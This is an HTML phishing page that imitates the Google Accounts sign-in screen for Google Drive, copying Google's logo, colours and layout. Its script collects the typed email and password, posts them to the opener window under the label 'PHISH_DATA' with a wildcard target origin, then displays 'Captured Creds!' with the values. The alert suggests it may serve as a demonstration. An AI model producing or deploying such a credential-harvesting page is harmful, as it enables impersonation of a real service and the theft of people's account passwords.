<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Google Accounts - Sign In</title>
    <style>
        body {
            font-family: 'Google Sans', Roboto, sans-serif;
            background-color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        .login-card { width: 360px; text-align: center; }
        .logo { width: 75px; margin-bottom: 20px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
        p { color: #202124; font-size: 16px; margin-bottom: 30px; }

        input {
            width: 100%;
            padding: 13px 15px;
            margin-bottom: 20px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }

        input:focus {
            outline: none;
            border: 2px solid #1a73e8;
            padding: 12px 14px;
        }

        .btn {
            background-color: #1a73e8;
            color: white;
            padding: 10px 24px;
            border: none;
            border-radius: 4px;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
            float: right;
            margin-top: 10px;
        }

        .btn:hover { background-color: #1765cc; }

        .footer {
            margin-top: 40px;
            font-size: 12px;
            color: #70757a;
            display: flex;
            justify-content: space-between;
            width: 100%;
        }
    </style>
</head>
<body>

<div class="login-card">
    <svg class="logo" viewBox="0 0 24 24">
        <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
        <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
        <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"/>
        <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
    </svg>
    <h1>Sign in</h1>
    <p>to continue to Google Drive</p>
    
    <input type="email" placeholder="Email" id="email">
    <input type="password" placeholder="Password" id="password">
    
    <div style="text-align: left; color: #1a73e8; font-size: 14px; font-weight: 500; cursor: pointer;">
        Forgot password?
    </div>

    <button class="btn" onclick="submit()">Next</button>
</div>

<script>
    function submit() {
        const e = document.getElementById('email').value;
        const p = document.getElementById('password').value;
        
        if (window.opener) {
            window.opener.postMessage({
                type: 'PHISH_DATA',
                email: e,
                password: p
            }, '*');
        }
        
        alert("Captured Creds!\nEmail " + e + "\nPass " + p);
        window.close();
    }
</script>

</body>
</html>
